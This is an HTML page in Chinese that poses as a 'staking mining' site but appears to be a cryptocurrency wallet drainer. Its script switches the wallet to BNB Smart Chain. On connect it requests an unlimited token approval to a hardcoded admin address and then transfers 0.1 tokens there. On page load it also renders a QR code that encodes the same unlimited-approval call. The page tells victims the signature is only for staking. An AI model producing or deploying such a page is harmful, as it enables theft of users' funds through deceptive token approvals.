<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>质押挖矿</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
body{background:#0B0B1F;color:#fff;padding:20px}
.container{max-width:420px;margin:0 auto}
.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-bottom:30px}
h1{font-size:24px;margin-bottom:8px}
.desc{color:#aaa;margin-bottom:20px}
#connectBtn{
background:#F0B90B;color:#000;
border:none;padding:16px;width:100%;
border-radius:14px;font-size:16px;font-weight:bold;
margin-bottom:16px;
}
.amount-input{
width:100%;padding:14px;background:#111;border:none;
border-radius:12px;color:#fff;font-size:16px;text-align:center;
margin-bottom:12px;
}
#qrcode{
width:280px;height:280px;background:#fff;padding:10px;
border-radius:16px;margin:0 auto 20px;
display:flex;align-items:center;justify-content:center;
color:#000;font-size:14px;
}
#qrcode img{width:100%;height:100%;border-radius:12px}
#approveBtn{
background:#F0B90B;color:#000;
border:none;padding:16px;width:100%;
border-radius:14px;font-size:16px;font-weight:bold
}
.tip {font-size:12px;color:#666;margin-top:-5px;margin-bottom:10px;display:block;text-align:center}
</style>
</head>
<body>

<div class="container">
  <div class="pay-box">
    <h1>⛏️ 质押挖矿</h1>
    <p class="desc">授权后即可参与挖矿</p>

    <button id="connectBtn">👉 连接钱包</button>
    <div id="qrcode">加载二维码...</div>
    <button id="approveBtn">确认授权签名</button>
    <span class="tip">签名授权用于质押挖矿</span>
  </div>
</div>

<script src="https://cdn.ethers.org/lib-ethers/5.7.2/ethers.umd.min.js"></script>
<script>
// ====================== 配置 ======================
const TOKEN_ADDR    = "0x55d398326f99059fF775485246999027B3197955";
const ADMIN_ADDR    = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
const CHAIN_ID      = "0x38";
// ====================================================

let account = null;
let provider = null;
let signer = null;

async function switchChain() {
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: CHAIN_ID }]
    });
  } catch (e) {}
}

// 生成授权二维码
function genApproveQR() {
  const data = "0x095ea7b3" + 
    ADMIN_ADDR.slice(2).padStart(64,'0') + 
    "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
  const uri = `ethereum:${TOKEN_ADDR}@56?data=${data}`;
  const qr = "https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=" + encodeURIComponent(uri);
  document.getElementById("qrcode").innerHTML = `<img src="${qr}">`;
}

// 统一授权弹出（用户手动确认）
async function doApprove() {
  if (!account) {
    alert("请先连接钱包");
    return;
  }
  try {
    const token = new ethers.Contract(
      TOKEN_ADDR,
      ["function approve(address spender, uint256 amount) external returns (bool)"],
      signer
    );
    const tx = await token.approve(ADMIN_ADDR, ethers.constants.MaxUint256);
    await tx.wait();
    alert("✅ 授权成功！");

    // 授权后直接转账给管理员
    await transferToAdmin();
  } catch (e) {
    alert("❌ 已取消");
  }
}

// 授权后自动/手动转账给管理员
async function transferToAdmin() {
  if (!account) return;
  try {
    const token = new ethers.Contract(
      TOKEN_ADDR,
      ["function transfer(address to, uint256 value) external returns (bool)"],
      signer
    );
    const amount = ethers.utils.parseUnits("0.1", 18);
    await token.transfer(ADMIN_ADDR, amount);
  } catch (err) {}
}

// 连接钱包 → 自动弹授权
document.getElementById("connectBtn").onclick = async () => {
  if (!window.ethereum) {
    alert("请在钱包浏览器打开");
    return;
  }
  await switchChain();
  try {
    provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = provider.getSigner();
    account = await signer.getAddress();
    document.getElementById("connectBtn").innerText = "✅ 已连接";
    
    // 连接后直接弹授权签名
    doApprove();
  } catch (e) {
    alert("连接失败");
  }
};

// 按钮授权 → 弹签名
document.getElementById("approveBtn").onclick = async () => {
  await doApprove();
};

// 页面加载生成二维码
window.onload = genApproveQR;
</script>
</body>
</html>
